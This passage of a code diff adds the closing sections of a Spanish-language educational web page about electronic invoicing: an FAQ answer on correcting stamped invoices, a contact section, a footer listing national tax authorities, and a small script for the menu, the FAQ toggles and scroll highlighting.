+          <p>Debes cancelar la factura errónea dentro de los plazos permitidos y emitir una nueva con los datos correctos. Nunca debes modificar directamente el archivo XML ya timbrado, ya que eso invalidaría la firma digital y podría generar problemas legales.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section id="contacto" class="cta-section">
+  <div class="container">
+    <h2>¿Listo para digitalizar tu facturación?</h2>
+    <p>Consulta con un experto o revisa la normativa oficial de tu país para comenzar con el pie derecho.</p>
+    <div class="hero-btns">
+      <a href="mailto:info@facturanet.example" class="btn-white">Contactar a un experto</a>
+      <a href="#faq" class="btn-outline">Ver más preguntas</a>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div class="footer-top">
+      <div>
+        <div class="footer-logo">FacturaNet</div>
+        <p class="footer-desc">Portal informativo sobre facturación electrónica. No somos un proveedor de servicios; toda la información es de carácter educativo.</p>
+      </div>
+      <div class="footer-col">
+        <h4>Contenido</h4>
+        <ul>
+          <li><a href="#que-es">¿Qué es?</a></li>
+          <li><a href="#tipos">Tipos</a></li>
+          <li><a href="#elementos">Elementos</a></li>
+          <li><a href="#proceso">Proceso</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Info</h4>
+        <ul>
+          <li><a href="#beneficios">Beneficios</a></li>
+          <li><a href="#faq">FAQ</a></li>
+          <li><a href="#contacto">Contacto</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Países</h4>
+        <ul>
+          <li><a href="#">México (SAT)</a></li>
+          <li><a href="#">Colombia (DIAN)</a></li>
+          <li><a href="#">Perú (SUNAT)</a></li>
+          <li><a href="#">Chile (SII)</a></li>
+          <li><a href="#">España (AEAT)</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      © 2026 FacturaNet · Información educativa · No constituye asesoría legal o fiscal
+    </div>
+  </div>
+</footer>
+
+<script>
+  function toggleNav() {
+    document.getElementById('navLinks').classList.toggle('open');
+  }
+
+  function toggleFaq(btn) {
+    const answer = btn.nextElementSibling;
+    const isOpen = answer.classList.contains('open');
+    document.querySelectorAll('.faq-a').forEach(a => a.classList.remove('open'));
+    document.querySelectorAll('.faq-q').forEach(q => q.classList.remove('open'));
+    if (!isOpen) {
+      answer.classList.add('open');
+      btn.classList.add('open');
+    }
+  }
+
+  window.addEventListener('scroll', () => {
+    let current = '';
+    document.querySelectorAll('section[id]').forEach(s => {
+      if (window.scrollY >= s.offsetTop - 80) current = s.id;
+    });
+    document.querySelectorAll('.nav-links a').forEach(a => {
+      a.style.color = a.getAttribute('href') === '#' + current ? 'var(--blue)' : '';
+    });
+  });
+</script>
+
+</body>
+</html>
